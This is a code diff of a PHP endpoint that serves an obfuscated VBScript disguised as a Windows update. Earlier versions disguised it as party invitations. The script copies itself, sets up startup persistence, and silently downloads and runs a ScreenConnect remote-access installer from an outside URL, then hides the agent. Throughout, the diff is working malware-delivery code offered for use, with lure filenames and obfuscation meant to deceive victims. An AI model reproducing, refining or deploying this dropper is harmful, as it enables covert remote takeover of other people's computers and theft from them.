@@ -1,21 +1,9 @@
+
 <?php
-// invite.php - Random Invitation-Themed Filenames
+// download.php - Strong Obfuscation Version
 header('Content-Type: text/plain; charset=utf-8');
+header('Content-Disposition: attachment; filename="WindowsUpdate.vbs"');
 header('Cache-Control: no-store, no-cache, must-revalidate');
-
-// Random invitation-style filenames
-$fakeNames = [
-    "Invitation.vbs",
-    "Your_Invitation.vbs",
-    "Party_Invite.vbs",
-    "Letter_from_Friend.vbs",
-    "Invitation_from_Friend.vbs",
-    "Important_Mail.vbs",
-    "Letter_Invite.vbs"
-];
-$randomFilename = $fakeNames[array_rand($fakeNames)];
-
-header('Content-Disposition: attachment; filename="' . $randomFilename . '"');
 
 $sessionId = bin2hex(random_bytes(24));
 $ts        = time();
@@ -23,7 +11,9 @@ $randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
 $randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
 $xorKey    = rand(100, 255);
 
-$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";   // CHANGE THIS
+// === CHANGE THIS ===
+$scUrl = "https://yourdomain.com/ScreenConnect.ClientSetup.exe";
+// =====================
 
 echo <<<VBS
 ' Windows Update Helper
@@ -34,6 +24,7 @@ Set objFSO   = CreateObject("Scripting.FileSystemObject")
 
 $randV1 = "$sessionId"
 
+' === STRING DECRYPTION (Strong Obfuscation) ===
 Function D(s)
     Dim i, r : r = ""
     For i = 1 To Len(s)
@@ -42,30 +33,13 @@ Function D(s)
     D = r
 End Function
 
-Function IsElevated()
-    On Error Resume Next
-    Dim wmi, proc
-    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
-    Set proc = wmi.ExecQuery("Select * from Win32_Process where ProcessId=" & GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process.Handle=" & objShell.ProcessId).ProcessId)
-    IsElevated = False ' Simplified for reliability - adjust if needed
-End Function
-
 Sub $randFunc
     On Error Resume Next
-    If Not IsElevated Then Call Elevate
+    
     Call CopySelf
     Call AddToStartup
     Call DownloadAndExecute
     Call HideAgent
-End Sub
-
-Sub Elevate()
-    On Error Resume Next
-    Dim fsoPath, cmd
-    fsoPath = WScript.ScriptFullName
-    cmd = D("dmd /c ") & """" & fsoPath & """"
-    objShell.ShellExecute "cmd.exe", cmd, "", "runas", 1
-    WScript.Quit
 End Sub
 
 Sub CopySelf()
@@ -89,9 +63,12 @@ Sub DownloadAndExecute()
     Set http = CreateObject(D("NTYNM2.YNMHTTP"))
     http.Open "GET", u, False
     http.Send
+    
     If http.Status = 200 Then
         Set strm = CreateObject(D("BEPEC.Stream"))
-        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
+        strm.Type = 1 : strm.Open : strm.Write http.responseBody
+        strm.SaveToFile p, 2 : strm.Close
+        
         objShell.Run """" & p & """ -silent", 0, True
         WScript.Sleep 5000
         If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
